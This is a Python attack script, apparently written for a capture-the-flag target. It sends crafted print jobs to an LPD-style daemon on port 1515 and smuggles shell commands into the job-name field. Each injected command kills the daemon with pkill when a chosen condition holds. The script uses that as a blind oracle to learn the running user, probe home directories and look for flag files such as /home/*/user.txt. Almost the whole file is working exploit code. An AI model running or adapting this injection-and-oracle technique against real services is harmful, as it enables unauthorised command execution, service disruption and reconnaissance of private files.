#!/usr/bin/env python3
"""Fixed oracle using proper LPD protocol flow."""
import socket, time, sys

T = '10.129.38.158'

def lpd(jn, t=5):
    """Send job with injection. Proper protocol: send subcommand immediately."""
    s = socket.socket()
    s.settimeout(t)
    try:
        s.connect((T, 1515))
        # Start print job - queue name + newline
        s.send(b'\x02archive_intake\n')
        # Don't wait for ACK - daemon blocks on recv for subcommand
        # Send subcommand immediately (control file with J field)
        ct = f'J{jn}\n'
        s.send(b'\x02' + str(len(ct)).encode() + b'\n' + ct.encode())
        # Wait for ACK
        time.sleep(0.3)
        s.recv(4096)
    except socket.timeout:
        pass
    except:
        pass
    finally:
        s.close()

def alive():
    """Check if daemon is responsive."""
    s = socket.socket()
    s.settimeout(2)
    try:
        s.connect((T, 1515))
        s.send(b'\x03')
        d = s.recv(4096)
        s.close()
        return True
    except:
        return False

def kill_if(condition):
    """Inject: if condition is true, kill daemon. Returns True if killed."""
    lpd(f"';{condition} && pkill -f server.py;echo '")
    time.sleep(0.15)
    a = alive()
    if not a:
        for _ in range(30):
            time.sleep(0.3)
            if alive(): break
        return True
    return False

# FIRST test: verify oracle works
print("=== Verifying oracle ===", flush=True)

# Test 1: Is daemon alive?
print(f"Daemon initially alive: {alive()}", flush=True)

# Test 2: Kill with unconditional pkill
print("Testing unconditional kill...", flush=True)
if kill_if("true"):
    print("  Unconditional kill: WORKED (daemon killed)", flush=True)
else:
    print("  Unconditional kill: FAILED (daemon stayed alive)", flush=True)
    print("  The oracle approach doesn't work!", flush=True)
    sys.exit(1)

# Test 3: Test that false doesn't kill
time.sleep(2)
if not kill_if("false"):
    print("  False condition: CORRECT (daemon stayed alive)", flush=True)
else:
    print("  False condition: WRONG (daemon was killed)", flush=True)

# Now we know the oracle works!
# Find daemon user
print("\n=== Finding daemon user ===", flush=True)
for u in ['lp', 'nobody', 'daemon', 'www', 'www-data', 'lpd', 'archive', 'printer', 'spool', 'root']:
    if kill_if(f'[ "$(whoami)" = "{u}" ]'):
        print(f'  Daemon user: {u}', flush=True)
        break
    time.sleep(0.05)

# Find home directories
print("\n=== Finding home directories ===", flush=True)
for u in ['dave', 'paper', 'paperwork', 'lp', 'lpd', 'nobody', 'archivist', 'admin', 'printer', 'archive']:
    if kill_if(f'test -d /home/{u}'):
        print(f'  /home/{u}: EXISTS', flush=True)
        if kill_if(f'test -f /home/{u}/user.txt'):
            print(f'  *** /home/{u}/user.txt: FOUND! ***', flush=True)
    time.sleep(0.05)

# Check root-level flags
print("\n=== Root-level flag search ===", flush=True)
for f in ['/user.txt', '/flag.txt', '/flag', '/root/root.txt']:
    if kill_if(f'test -f {f}'):
        print(f'  {f}: EXISTS', flush=True)
    time.sleep(0.05)

# Check for /home/*/user.txt via shell glob
print("\n=== Shell glob search ===", flush=True)
if kill_if('c=$(cat /home/*/user.txt 2>/dev/null); test -n "$c"'):
    print('  FLAG readable at /home/*/user.txt!', flush=True)
else:
    print('  No flag at /home/*/user.txt', flush=True)

# Check readable via direct cat
print("\n=== Direct cat test ===", flush=True)
if kill_if('cat /home/*/user.txt > /dev/null 2>&1'):
    print('  cat /home/*/user.txt succeeds', flush=True)

print("\n=== Enumeration complete ===", flush=True)
